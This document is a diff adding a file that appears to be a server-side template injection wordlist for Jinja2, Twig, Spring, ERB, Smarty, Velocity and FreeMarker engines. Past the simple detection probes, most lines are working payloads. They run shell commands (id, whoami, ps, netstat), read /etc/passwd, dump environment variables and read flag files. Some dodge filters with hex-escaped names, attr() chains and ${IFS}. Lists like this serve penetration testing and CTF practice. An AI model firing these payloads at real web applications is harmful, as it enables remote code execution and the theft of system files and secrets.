@@ -1,0 +1,171 @@
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+{7*7}
+#set($x=7*7)
+${{7*7}}
+${7*'7'}
+{{7*'7'}}
+<%= 7*'7' %>
+{7*'7'}
+{{7*'7'}}${7*'7'}
+{{7*'7'}}${7*'7'}<%= 7*'7' %>{7*'7'}
+${{<%[%'"}}%\
+{{}}${}<%= %>{7*7}
+{{7*7}}${7*7}<%= 7*7 %>{7*7}
+{{config}}${System}
+{{self}}${_self}
+{{request}}${{request}}
+{{_self}}{{app}}${_self}
+{{config}}{{app}}{{_self}}${{_self}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+${T(java.lang.Runtime).getRuntime().exec('id')}
+<%= system('id') %>
+{php}system('id');{/php}
+#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($ex=$rt.getRuntime().exec('id'))
+${"freemarker.template.utility.Execute"?new()("id")}
+{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
+${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}
+<%= File.read('/etc/passwd') %>
+{php}echo file_get_contents('/etc/passwd');{/php}
+${"freemarker.template.utility.Execute"?new()("cat /etc/passwd")}
+{{lipsum.__globals__['os'].popen('cat /etc/passwd').read()}}
+{{['id']|filter('system')}}
+{{['id']|map('system')}}
+{%for c in [].__class__.__base__.__subclasses__()%}{%if c.__name__=='catch_warnings'%}{{c.__init__.__globals__['__builtins__'].open('/etc/passwd','r').read()}}{%endif%}{%endfor%}
+${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream())}
+<%= `whoami` %>
+{php}system('whoami');{/php}
+${"freemarker.template.utility.Execute"?new()("whoami")}
+#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($ex=$rt.getRuntime().exec('whoami'))
+{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__.__builtins__['open']('/etc/passwd').read()}}
+${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).useDelimiter('\\Z').next()}
+<%= IO.popen('id').read %>
+{php}passthru('id');{/php}
+{{cycler.__init__.__globals__.os.popen('id').read()}}
+{{joiner.__init__.__globals__.os.popen('id').read()}}
+{{namespace.__init__.__globals__.os.popen('id').read()}}
+${{<%=1%>}}
+${{<%=system('id')%>}}
+{{7*7}}${{7*7}}
+{{7*7}}${7*7}
+{{7*'7'}}${{7*'7'}}
+{{'a'.toUpperCase()}}${{config}}
+{{request}}${_self}
+{{get_flashed_messages.__globals__['os'].popen('ls').read()}}
+${T(java.lang.Runtime).getRuntime().exec('ls -la')}
+<%= `ls -la` %>
+{php}system('ls -la');{/php}
+${"freemarker.template.utility.Execute"?new()("ls -la")}
+#set($runtime=$class.inspect("java.lang.Runtime").type)#set($process=$runtime.getRuntime().exec("ls"))
+{{config.__class__.__init__.__globals__['os'].popen('uname -a').read()}}
+${T(java.lang.System).getProperty('os.name')}
+<%= RUBY_PLATFORM %>
+{php}echo php_uname();{/php}
+${"freemarker.template.utility.Execute"?new()("uname -a")}
+{{url_for.__globals__['__builtins__']['__import__']('os').popen('env').read()}}
+${T(java.lang.System).getenv()}
+<%= ENV %>
+{php}print_r($_ENV);{/php}
+{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('pwd').read()}}
+${T(java.lang.System).getProperty('user.dir')}
+<%= Dir.pwd %>
+{php}echo getcwd();{/php}
+${"freemarker.template.utility.Execute"?new()("pwd")}
+{{''.__class__.__mro__[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}
+${T(java.lang.Runtime).getRuntime().exec('cat flag.txt')}
+<%= File.read('flag.txt') %>
+{php}echo file_get_contents('flag.txt');{/php}
+${"freemarker.template.utility.Execute"?new()("cat flag.txt")}
+{{request.__class__._load_form_data.__globals__.__builtins__.__import__('os').popen('ps aux').read()}}
+${T(java.lang.Runtime).getRuntime().exec('ps aux')}
+<%= `ps aux` %>
+{php}system('ps aux');{/php}
+{{lipsum|attr("__globals__")|attr("__getitem__")("os")|attr("popen")("ifconfig")|attr("read")()}}
+${T(java.lang.Runtime).getRuntime().exec('ifconfig')}
+<%= `ifconfig` %>
+{php}system('ifconfig');{/php}
+{{''['\x5f\x5fclass\x5f\x5f']['\x5f\x5fmro\x5f\x5f'][1]['\x5f\x5fsubclasses\x5f\x5f']()[396]('netstat -an',shell=True,stdout=-1).communicate()[0].strip()}}
+${T(java.lang.Runtime).getRuntime().exec('netstat -an')}
+<%= `netstat -an` %>
+{php}system('netstat -an');{/php}
+{{7*7}}{{7*'7'}}${{7*7}}${7*7}#{7*7}
+{{config}}{{self}}{{request}}{{app}}{{_self}}
+{{lipsum.__globals__}}${T(java.lang.System).getenv()}<%= ENV %>
+{%print(lipsum.__globals__)%}
+${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder","id").start()}
+#set($pb=$class.inspect("java.lang.ProcessBuilder").type)#set($arr=["id"])#set($process=$pb.newInstance($arr).start())
+{{''.__class__.__base__.__subclasses__()}}
+${T(java.lang.Class).forName('java.lang.Runtime')}
+<%= ObjectSpace.each_object(Class).to_a %>
+{php}get_declared_classes();{/php}
+{{request.application.__globals__.__builtins__}}
+${T(java.lang.Runtime).getRuntime()}
+<%= Kernel.methods %>
+{$smarty.version}
+{{lipsum.__globals__['__builtins__']}}
+${@systemProperties}
+<%= defined?(Rails) %>
+{php}defined('SMARTY_VERSION');{/php}
+{{''.__class__.__mro__[1].__subclasses__()[40]}}
+${new java.io.File('/etc/passwd')}
+<%= File.new('/etc/passwd') %>
+{php}new SplFileObject('/etc/passwd');{/php}
+{{config.__class__}}
+${T(java.lang.String).getClass()}
+<%= self.class %>
+{php}get_class($this);{/php}
+${"freemarker.template.utility.Execute"?new()("cat /etc/passwd")}
+{{request.__class__.__mro__[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()}}
+${{7*7}}[{7*7}]
+${{<%[7*7]%>}}
+${7*7}{{7*7}}<%= 7*7 %>{7*7}#set($x=7*7)
+{{}}${}<%=%>{}#
+{{config}}${_self}<%= self %>{$smarty}
+{{7*7}}${7*7}#set($x=49)
+{{''.__class__}}${T(java.lang.String)}<%= ''.class %>
+{{request.application}}${applicationScope}<%= defined?(Rails) %>
+{%for c in [].__class__.__base__.__subclasses__()%}{{c}}{%endfor%}
+${"freemarker.template.utility.Execute"?new()("whoami")}
+#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))$rt
+<%= `id` %>
+{php}system('id');{/php}
+{{lipsum.__globals__.os}}
+${T(java.lang.System)}
+<%= IO %>
+{$smarty.server}
+{{config.items()}}
+${@environment}
+<%= ENV.to_h %>
+{php}$_SERVER{/php}
+{{url_for.__globals__}}
+${{#request}}
+<%= request %>
+{{''.__class__.__mro__[2].__subclasses__()}}
+${T(java.lang.Runtime).getRuntime().exec(new String[]{'sh','-c','id'})}
+<%= Open3.capture2('id') %>
+{php}exec('id',$output);print_r($output);{/php}
+{{lipsum|attr('\x5f\x5fglobals\x5f\x5f')}}
+${T(java.lang.Runtime).getRuntime().exec('cat${IFS}/etc/passwd')}
+<%= `cat${IFS}/etc/passwd` %>
+{php}system('cat${IFS}/etc/passwd');{/php}
+{{cycler|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')}}
+${"freemarker.template.utility.Execute"?new()("cat$IFS/etc/passwd")}
+{{''.__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()}}
+${new java.util.Scanner(new java.io.File('/etc/passwd')).useDelimiter('\\Z').next()}
+<%= File.open('/etc/passwd').read %>
+{php}readfile('/etc/passwd');{/php}
+{{dict.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['open']('/etc/passwd').read()}}
+${"freemarker.template.utility.Execute"?new()("calc")}
+#set($runtime=$class.inspect("java.lang.Runtime").type)#set($process=$runtime.getRuntime().exec("calc"))
+<%= `calc` rescue `open /Applications/Calculator.app` %>
+{php}system('calc');{/php}
+{{7*7}}{{7*'7'}}{{config}}{{self}}
+${{7*7}}${7*7}${_self}${app}
+<%= 7*7 %><%= '7'*7 %><%= self %>
+{7*7}{7*'7'}{$smarty}
+#set($x=7*7)$x
+{{request.application.__globals__.__builtins__.__import__('os')}}
+${T(java.lang.Runtime)}
+<%= require 'open3' %>
+{php}dl('suhosin.so');{/php}
